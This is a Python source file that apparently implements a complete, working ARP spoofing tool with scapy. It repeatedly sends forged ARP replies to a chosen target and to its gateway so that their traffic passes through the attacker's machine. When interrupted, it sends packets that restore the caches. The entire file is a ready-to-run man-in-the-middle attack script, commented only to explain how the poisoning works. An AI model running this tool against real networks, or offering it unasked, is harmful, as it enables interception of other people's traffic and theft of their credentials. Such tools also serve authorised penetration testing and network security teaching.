import argparse
from time import sleep

from scapy.all import conf, srp, sendp
from scapy.layers.l2 import Ether, ARP


def get_mac_from_ip(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=0.5, verbose=False)
    if ans:
        return ans[0][1].src


# Poison (or "spoof") the ARP cache
def poison(target_ip, target_mac, host_ip, host_mac, verbose=False):

    if verbose:
        print("Preparing to send ARP poisoning packets...")

    # We send the first ARP is-at packet (we tell the target that our MAC address is at the host's IP)
    pkt = Ether(target_mac) / ARP(op="is-at", pdst=target_ip, hwdst=target_mac,
                                  psrc=host_ip)  # The host_ip is the important thing here
    sendp(pkt, verbose=False)

    # We send the second ARP is-at packet (telling the host that our MAC address is at the target's IP)
    pkt = Ether(host_mac) / ARP(op="is-at", pdst=host_ip, hwdst=host_mac,
                                psrc=target_ip)  # We tell the host that the packet originated from the target
    sendp(pkt, verbose=False)

    if verbose:
        print(f"Sent poison to client ({target_mac} | {target_ip})")
        print(f"Sent poison to  host  ({host_mac} | {host_ip})")


# Heal (or "restore") the ARP cache
def heal(target_ip, target_mac, host_ip, host_mac, verbose=False):

    if verbose:
        print("Preparing to heal target and host...")

    # Prepare the heals
    client_heal = Ether(target_mac) / ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    host_heal = Ether(host_mac) / ARP(op="is-at", pdst=host_ip, hwdst=host_mac, psrc=target_ip, hwsrc=target_mac)

    # Heal both machines (we send 8 packets to be sure)
    sendp(client_heal, count=8, verbose=False)
    sendp(host_heal, count=8, verbose=False)

    if verbose:
        print("Healed target and host")


def main(target_ip, host_ip=None, verbose=False):
    if verbose:
        print("Getting MAC addresses...")

    # Host IP or router IP by default
    if not host_ip:
        host_ip = conf.route.route("0.0.0.0")[2]

    # Get the mac addresses
    target_mac = get_mac_from_ip(target_ip)
    host_mac = get_mac_from_ip(host_ip)

    try:
        while True:
            poison(target_ip, target_mac, host_ip, host_mac, verbose)
            sleep(5)
    except KeyboardInterrupt:
        heal(target_ip, target_mac, host_ip, host_mac, verbose)
        exit(0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("target_ip")
    parser.add_argument("-H", "--host", help="Defines a host IP")
    parser.add_argument("-V", "--verbose", help="Activates verbose", action="store_true")

    args = parser.parse_args()
    main(args.target_ip, args.host, args.verbose)
